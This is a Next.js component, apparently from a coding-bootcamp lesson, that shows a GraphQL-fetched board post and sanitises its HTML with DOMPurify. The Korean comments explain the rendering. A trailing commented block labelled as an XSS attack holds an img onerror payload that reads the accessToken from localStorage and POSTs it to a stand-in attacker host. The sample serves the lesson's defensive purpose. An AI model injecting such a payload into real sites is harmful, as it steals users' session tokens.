"use client";

import { gql, useQuery } from "@apollo/client";
import { useParams } from "next/navigation";
import DOMPurify from "dompurify";

const FETCH_BOARD = gql`
  query fetchBoard($boardId: ID!) {
    fetchBoard(boardId: $boardId) {
      _id
      writer
      title
      contents
    }
  }
`;

export default function WebEditorDetailPage() {
  const params = useParams();
  const { data } = useQuery(FETCH_BOARD, {
    variables: {
      boardId: params.boardId,
    },
  });

  return (
    <>
      <div>작성자: {data?.fetchBoard.writer}</div>
      <div>제목: {data?.fetchBoard.title}</div>
      {/* <div>내용: {data?.fetchBoard.contents}</div> */}

      {/* 내용에 들어있는 태그를 문자열이 아닌 진짜 태그로 인식하기 */}
      {typeof window !== "undefined" ? (
        <div
          dangerouslySetInnerHTML={{
            __html: DOMPurify.sanitize(data?.fetchBoard.contents), // 내용에 들어있는 script 관련 태그들을 막아줘!
          }}
        />
      ) : (
        <div></div>
      )}
    </>
  );
}

// // graphQL XSS 공격
// ===============================================

// <img src="@" onerror='const 훔친토큰 = localStorage.getItem("accessToken");
// fetch("http://main-hacker.codebootcamp.co.kr/token", {
//   method: "POST",
//   headers: {"Content-Type": "application/json"},
//   body: JSON.stringify({token:훔친토큰})
// })'/>

// ===============================================
